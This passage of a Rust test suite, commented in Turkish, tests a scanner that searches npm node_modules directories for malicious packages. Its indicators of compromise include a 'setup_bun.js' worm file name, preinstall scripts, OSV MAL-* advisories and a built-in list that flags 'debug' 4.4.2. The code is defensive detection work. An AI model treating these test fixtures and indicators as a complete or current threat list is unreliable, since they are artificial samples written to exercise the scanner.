            }),
        );
        std::fs::write(worm.join("setup_bun.js"), "").unwrap();

        let scan = scan(&[temp.0.join("node_modules")]);
        let kinds: Vec<Kind> = scan.findings.iter().map(|finding| finding.kind).collect();
        // `test` betiği kurulumda çalışmaz; yalnızca `preinstall` sayılır.
        assert_eq!(kinds, [Kind::IocFile, Kind::Script]);
    }

    #[test]
    fn bozuk_ve_adsiz_manifestler_atlanir() {
        let temp = TempDir::new("broken");
        let broken = temp.0.join("node_modules/broken");
        std::fs::create_dir_all(&broken).unwrap();
        std::fs::write(broken.join("package.json"), "{ bozuk").unwrap();
        temp.package("node_modules/helper", serde_json::json!({ "type": "module" }));

        let scan = scan(&[temp.0.join("node_modules"), temp.0.join("yok")]);
        assert_eq!(scan.packages, 0);
        assert!(scan.findings.is_empty());
    }

    #[test]
    fn proje_aramasi_gizli_dizinleri_ve_ic_node_modules_atlar() {
        let temp = TempDir::new("walk");
        temp.package("app/node_modules/a/node_modules/b", pkg("b", "1.0.0"));
        temp.package(".cache/node_modules/c", pkg("c", "1.0.0"));
        temp.package("Library/x/node_modules/d", pkg("d", "1.0.0"));

        let found = find_node_modules(&temp.0, &["Library"]);
        assert_eq!(found, [temp.0.join("app/node_modules")]);

        // Yolun kendisi node_modules ise olduğu gibi kullanılır.
        let direct = temp.0.join("app/node_modules");
        assert_eq!(roots_under(&direct), [direct.clone()]);
    }

    #[test]
    fn desen_acilimi() {
        let temp = TempDir::new("expand");
        std::fs::create_dir_all(temp.0.join("node/v20/lib")).unwrap();
        std::fs::create_dir_all(temp.0.join("node/v22/lib")).unwrap();

        let paths = expand(&temp.0, "node/*/lib");
        assert_eq!(paths, [temp.0.join("node/v20/lib"), temp.0.join("node/v22/lib")]);
        assert!(expand(&temp.0, "yok/*/lib").is_empty());
    }

    #[test]
    fn osv_yaniti_yalnizca_mal_kayitlarini_alir() {
        let a = ("temiz".to_string(), "1.0.0".to_string());
        let b = ("zararli".to_string(), "2.0.0".to_string());
        let c = ("acikli".to_string(), "3.0.0".to_string());
        let packages = [&a, &b, &c];

        let request: Value = serde_json::from_str(&osv_request(&packages)).unwrap();
        assert_eq!(request["queries"][1]["package"]["ecosystem"], "npm");
        assert_eq!(request["queries"][1]["package"]["name"], "zararli");
        assert_eq!(request["queries"][1]["version"], "2.0.0");

        let response = r#"{"results":[
            {},
            {"vulns":[{"id":"GHSA-xxxx","modified":"x"},{"id":"MAL-2025-1","modified":"x"}]},
            {"vulns":[{"id":"GHSA-yyyy","modified":"x"}]}
        ]}"#;
        let hits = parse_osv(response, &packages).unwrap();
        assert_eq!(
            hits,
            [OsvHit {
                package: "zararli".into(),
                version: "2.0.0".into(),
                ids: vec!["MAL-2025-1".into()],
            }]
        );

        assert!(parse_osv(r#"{"results":[{}]}"#, &packages).is_err());
        assert!(parse_osv("<html>", &packages).is_err());
    }

    #[test]
    fn osv_bulgusu_gomulu_listeyi_yinelemez() {
        let temp = TempDir::new("osv");
        temp.package("node_modules/debug", pkg("debug", "4.4.2"));
        let mut scan = scan(&[temp.0.join("node_modules")]);

        let hit = |package: &str| OsvHit {
            package: package.into(),
            version: "4.4.2".into(),
            ids: vec!["MAL-1".into()],
        };
        scan.add_osv(vec![hit("debug"), hit("yeni-zararli")]);

        let kinds: Vec<(Kind, &str)> = scan
            .findings
            .iter()
            .map(|finding| (finding.kind, finding.package.as_str()))
            .collect();
        assert_eq!(kinds, [(Kind::Known, "debug"), (Kind::Osv, "yeni-zararli")]);
    }
}
